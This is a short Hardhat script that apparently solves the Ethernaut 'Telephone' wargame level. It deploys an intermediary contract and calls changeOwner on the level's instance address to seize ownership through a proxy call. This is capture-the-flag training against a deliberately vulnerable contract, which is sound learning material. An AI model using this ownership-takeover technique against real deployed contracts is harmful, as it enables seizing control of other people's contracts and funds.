const { ethers, waffle } = require("hardhat");

async function main() {

    const [deployer] = await ethers.getSigners();
    const provider = waffle.provider;

    const deployerBalanceInWei = await provider.getBalance(deployer.address);
    console.log("Deployer address is " + deployer.address + " and has a balance of " + deployerBalanceInWei);

    console.log("Deploying CallTelephone contract...")
    const CallTelephone = await ethers.getContractFactory("CallTelephone");
    const callerTelephone = await CallTelephone.deploy({ gasLimit: 1000000 })
    console.log("Deployed CallTelephone contract at", callerTelephone.address);

    // Where the changeOwner parameter is the contract instance that ethernaut launched for our account
    await callerTelephone.changeOwner("0xF1cD48653f8C0d2aD2E8cA16C1a40cc5C5D5c3e4");

}


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });